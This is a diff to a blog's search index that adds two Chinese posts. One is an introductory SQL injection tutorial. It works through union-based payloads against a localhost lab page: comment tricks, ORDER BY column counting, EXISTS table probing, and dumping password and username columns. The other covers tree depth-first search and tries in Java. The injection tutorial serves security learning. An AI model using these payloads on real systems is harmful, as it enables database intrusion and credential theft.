@@ -1,6 +1,63 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>sql注入基础</title>
+    <url>/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="消除之后字符串的几种方法"><a href="#消除之后字符串的几种方法" class="headerlink" title="消除之后字符串的几种方法"></a>消除之后字符串的几种方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;George&#39; &amp;23   [%23 url解码后是#]</span><br><span class="line"></span><br><span class="line">?name&#x3D;George&#39; --%20   [%20 url解码后是space]</span><br><span class="line"></span><br><span class="line">?name&#x3D;George&#39; --+   [+ url解码后是space]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="怎么测试自己想要输入的东西"><a href="#怎么测试自己想要输入的东西" class="headerlink" title="怎么测试自己想要输入的东西"></a>怎么测试自己想要输入的东西</h2><p>使用union函数</p>
+<p><strong>注意：使用union要注意前后列数相同</strong></p>
+<h2 id="怎么确定有多少列？"><a href="#怎么确定有多少列？" class="headerlink" title="怎么确定有多少列？"></a>怎么确定有多少列？</h2><blockquote>
+<p>order by n 指的是根据第n列进行排序，而当n&gt;真实列数之后就会报错</p>
+</blockquote>
+<h2 id="怎么回显出你想要的数据？"><a href="#怎么回显出你想要的数据？" class="headerlink" title="怎么回显出你想要的数据？"></a>怎么回显出你想要的数据？</h2><p>正常回显一般显示第一行数据，例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>会回显：</p>
+<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
+<p>此时需要使第一个条件无法检索出来数据，例如使用不存在的字段‘To’</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;To&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>会回显：</p>
+<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
+<h2 id="怎么判断一个表、列、字段是否存在？"><a href="#怎么判断一个表、列、字段是否存在？" class="headerlink" title="怎么判断一个表、列、字段是否存在？"></a>怎么判断一个表、列、字段是否存在？</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select exists (查询语句)</span><br><span class="line">select exists (select * from sql_1)</span><br></pre></td></tr></table></figure>
+
+<p>sql注入时，可以：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select exists (select * from sql_1) --+</span><br></pre></td></tr></table></figure>
+
+<p>测试是否有叫  ‘sql_1’  的表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select exists (select username from sql_1) --+</span><br></pre></td></tr></table></figure>
+
+<p>测试是否有叫  ‘username’  的列名</p>
+<h2 id="几种sql注入方法"><a href="#几种sql注入方法" class="headerlink" title="几种sql注入方法"></a>几种sql注入方法</h2><h3 id="最蠢的猜"><a href="#最蠢的猜" class="headerlink" title="最蠢的猜"></a>最蠢的猜</h3><ol>
+<li><p>判断注入点【数字型？字符型？】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39;</span><br><span class="line">通过回显判断注入点</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断列数【order函数】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; order by 3 --+</span><br><span class="line">寻找报错和不报错的临界值</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜库名、表名、列名【and exists】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; and exists(select * from sql_2) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; and exists(select * from sql_3) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/4.png" alt="4"></p>
+</li>
+<li><p>爆出字段名【union select】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Ton&#39; union select 1,pw,username  from sql_2 where id&#x3D;2--+</span><br><span class="line">改变id的值可以查看所有字段的值</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/5.png" alt="5"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
     <title>队列</title>
     <url>/2020/05/09/%E9%98%9F%E5%88%97/</url>
     <content><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>先进者先出，队列中最基本的操作是：入队enqueue()【放一个数据到队尾】，出队dequeue()【从队列头部取一个数据】。</p>
@@ -103,6 +160,66 @@
 ]]></content>
       <categories>
         <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>树的深度优先搜索</title>
+    <url>/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
+    <content><![CDATA[<h1 id="树的深度优先搜索"><a href="#树的深度优先搜索" class="headerlink" title="树的深度优先搜索"></a>树的深度优先搜索</h1><h2 id="图论的一些概念"><a href="#图论的一些概念" class="headerlink" title="图论的一些概念"></a>图论的一些概念</h2><p>有向图：所有的边都是有向边</p>
+<p>无向图：所有的边都是无向边</p>
+<p>混合图：都有</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/1.jpg" alt="1"></p>
+<p>出度：这个结点出去几条线</p>
+<p>入度：这个结点进去几条线</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/2.jpg" alt="2"></p>
+<p>通路：任意两点互相连通</p>
+<p>回路：一条通路的起始点v1和终止点vn相同</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/3.jpg" alt="3"></p>
+<p>树：没有简单回路的连通无向图</p>
+<p>有向树：一种特殊的树，边是有向的，且满足：</p>
+<ol>
+<li>有且只有一个结点入向为0，这个结点称为根</li>
+<li>除根以外的所有结点，入度都为1.从树根到任一结点有且只有一条有向通路</li>
+</ol>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/4.jpg" alt="4"></p>
+<h2 id="前缀树的构建和查询"><a href="#前缀树的构建和查询" class="headerlink" title="前缀树的构建和查询"></a>前缀树的构建和查询</h2><p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/5.jpg" alt="5"></p>
+<p>可以在叶子结点上添加此单词的解释</p>
+<h3 id="一些特殊情况"><a href="#一些特殊情况" class="headerlink" title="一些特殊情况"></a>一些特殊情况</h3><ol>
+<li>还没有到叶子结点，单词就结束了。【比如entire和entirely】此时要判断此非叶子结点是否为单词，若不是则字典里无此单词。</li>
+<li>搜索到叶子结点，仍无此单词，则字典里无此单词。</li>
+<li>搜索到一半，未到叶子结点，被查单词也有未匹配的字母，但下一个结点也无法匹配。则字典里无此单词。</li>
+</ol>
+<h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><p>这种前缀树的查找即属于<strong>深度优先搜索</strong></p>
+<h2 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h2><p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/6.jpg" alt="6"></p>
+<p>使用“栈”来遍历前缀树</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/7.jpg" alt="7"></p>
+<blockquote>
+<p>第 1 步，将初始结点 110 压入栈中。<br>第 2 步，弹出结点 110，搜出下一级结点 123、879、945 和 131。<br>第 3 步，将结点 123、879、945 和 131 压入栈中。<br>第 4 步，重复第 2 步和第 3 步弹出和压入的步骤，处理结点 123，将新发现结点 162 和 587 压入栈中。<br>第 5 步，处理结点 162，由于 162 是叶子结点，所以没有发现新的点。第 6 步，重复第 2 和第 3 步，处理结点 587，将新发现结点 681 压入栈中。<br>……<br>第 n-1 步，重复第 2 和第 3 步，处理结点 131，将新发现结点 906 压入栈中。<br>第 n 步，重复第 2 和第 3 步，处理结点 906，没有发现新的结点，也没有更多待处理的结点，整个过程结束。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 使用栈来实现深度优先搜索</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfsByStack</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;(); </span><br><span class="line">    <span class="comment">// 创建堆栈对象，其中每个元素都是TreeNode类型</span></span><br><span class="line">  stack.push(root);    <span class="comment">// 初始化的时候，压入根结点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!stack.isEmpty()) &#123;  <span class="comment">// 只要栈里还有结点，就继续下去</span></span><br><span class="line">  </span><br><span class="line">  TreeNode node = stack.pop();  <span class="comment">// 弹出栈顶的结点</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (node.sons.size() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 已经到达叶子结点了，输出</span></span><br><span class="line">    System.out.println(node.prefix + node.label);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 非叶子结点，遍历它的每个子结点</span></span><br><span class="line">    Iterator&lt;Entry&lt;Character, TreeNode&gt;&gt; iter </span><br><span class="line">      = node.sons.entrySet().iterator();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意，这里使用了一个临时的栈stackTemp</span></span><br><span class="line">    <span class="comment">// 这样做是为了保持遍历的顺序，和递归遍历的顺序是一致的</span></span><br><span class="line">    <span class="comment">// 如果不要求一致，可以直接压入stack</span></span><br><span class="line">    Stack&lt;TreeNode&gt; stackTemp = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">      stackTemp.push(iter.next().getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stackTemp.isEmpty()) &#123;</span><br><span class="line">      stack.push(stackTemp.pop());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="用什么数据结构构建前缀树？"><a href="#用什么数据结构构建前缀树？" class="headerlink" title="用什么数据结构构建前缀树？"></a>用什么数据结构构建前缀树？</h2><blockquote>
+<p>我们可以设计一个 TreeNode 类，表示有向树的结点和边。这个类需要体现前缀树结点最重要的两个属性。</p>
+<ul>
+<li><p>这个结点所代表的字符，要用 label 变量表示。</p>
+</li>
+<li><p>这个结点有哪些子结点，要用 sons 哈希映射表示。之所以用哈希，是为了便于查找某个子结点（或者说对应的字符）是否存在。</p>
+<p>另外，我们还可以用变量 prefix 表示当前结点之前的前缀，用变量 explanation 表示某个单词的解释。和之前一样，为了代码的简洁，所有属性都用了 public，避免读取和设置类属性的代码。</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 前缀树的结点</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">char</span> label;  <span class="comment">// 结点的名称，在前缀树里是单个字母</span></span><br><span class="line">  <span class="keyword">public</span> HashMap&lt;Character, TreeNode&gt; sons = <span class="keyword">null</span>; <span class="comment">// 使用哈希映射存放子结点。哈希便于确认是否已经添加过某个字母对应的结点。</span></span><br><span class="line">  <span class="keyword">public</span> String prefix = <span class="keyword">null</span>;   <span class="comment">// 从树的根到当前结点这条通路上，全部字母所组成的前缀。例如通路b-&gt;o-&gt;y，对于字母o结点而言，前缀是b；对于字母y结点而言，前缀是bo</span></span><br><span class="line">  <span class="keyword">public</span> String explanation = <span class="keyword">null</span>;  <span class="comment">// 词条的解释</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 初始化结点</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">TreeNode</span><span class="params">(<span class="keyword">char</span> l, String pre, String exp)</span> </span>&#123;</span><br><span class="line">   label = l;</span><br><span class="line">   prefix = pre; </span><br><span class="line">   explanation = exp;</span><br><span class="line">   sons = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>说到这里，你可能会好奇，为什么只有结点的定义，而没有边的定义呢？实际上，这里的有向边表达的是父子结点之间的关系，我把这种关系用 sons 变量来存储父结点。<br>需要注意的是，我们需要动态地构建这棵树。每当接收一个新单词时，代码都需要扫描这个单词的每个字母，并使用当前的前缀树进行匹配。如果匹配到某个结点，发现相应的字母结点并不存在，那么就建立一个新的树结点。这个过程不好理解，我也写了几行代码，你可以结合来看。其中，str 表示还未处理的字符串，parent 表示父结点。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 处理当前字符串的第一个字母</span><br><span class="line">char c &#x3D; str.toCharArray()[0];</span><br><span class="line">TreeNode found &#x3D; null;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果字母结点已经存在于当前父结点之下，找出它。否则就新生成一个</span><br><span class="line">if (parent.sons.containsKey(c)) &#123;</span><br><span class="line">  found &#x3D; parent.sons.get(c);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  TreeNode son &#x3D; new TreeNode(c, pre, &quot;&quot;);</span><br><span class="line">  parent.sons.put(c, son);</span><br><span class="line">  found &#x3D; son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>计算机与数学</category>
       </categories>
   </entry>
   <entry>
